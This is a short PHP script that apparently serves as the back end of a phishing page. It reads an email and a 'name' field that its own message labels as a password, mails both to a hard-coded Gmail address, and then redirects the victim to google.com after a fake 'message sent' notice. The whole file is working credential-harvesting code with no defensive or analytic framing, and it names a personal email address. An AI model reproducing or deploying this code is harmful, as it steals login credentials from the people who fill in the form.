<? 
// ----------------------------конфигурация-------------------------- // 
 
$adminemail="nikitinsergei1673@gmail.com";  // e-mail of administrator 
 
 
$date=date("d.m.y"); 
 
$time=date("H:i"); 
 
$backurl="google.com";  // Whitch page is next (Код мой, Коля)
 
//---------------------------------------------------------------------- // 
 
  
 
// Take forms
 
$email=$_POST['email']; 

$name=$_POST['name'];  
  
 
// Validating e-mail
 
if (!preg_match("|^([a-z0-9_\.\-]{1,20})@([a-z0-9\.\-]{1,20})\.([a-z]{2,4})|is", 
strtolower($email))) 
 
 { 
 
  echo 
"<center>Вернитесь <a 
href='javascript:history.back(1)'><B>назад</B></a>. Вы 
указали неверные данные!"; 
 
  } 
 
 else 
 
 { 
 
 
$msg=" 
 
 <p>E-mail: $email</p> 

 
  <p>Пароль: $name</p> 


 
"; 
 
  
 
 // Send e-mail to admin 
 
mail("$adminemail", "$date $time Сообщение 
от $email", "$name"); 
 
  
 
 
// msg out 
 
print "<script language='Javascript'><!-- 
function reload() {location = \"$backurl\"}; setTimeout('reload()', 6000); 
//--></script>  
 
<p>Сообщение отправлено! Подождите, сейчас вы будете перенаправлены на главную страницу...</p>";  
exit; 
 
 } 
 
?>